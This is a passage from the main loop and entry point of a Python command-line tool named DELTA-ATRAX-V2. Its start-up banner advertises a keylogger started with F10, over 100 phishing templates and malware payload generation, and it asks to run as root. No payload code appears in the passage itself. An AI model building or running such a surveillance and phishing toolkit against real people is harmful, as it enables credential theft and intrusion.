        if setup == 'y':
            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            self.config.set('web.port', int(port))
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Start web dashboard by default
        if WEB_AVAILABLE:
            self.web.start()
        
        print(f"\n{Colors.SUCCESS}✅ DELTA-ATRAX-V2 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ACCENT}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.ACCENT}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.ACCENT}   🎣 100+ Phishing Templates Available{Colors.RESET}")
        print(f"{Colors.ACCENT}   🦠 Malware Payload Generation Ready{Colors.RESET}")
        print(f"{Colors.ACCENT}   📊 Bar & Pie Chart Visualization{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.SECONDARY}{self.session_id}{Colors.PRIMARY}]{Colors.ACCENT} 🦀> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")


# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PRIMARY}🦀 Starting DELTA-ATRAX-V2...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = DeltaAtraxV2()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
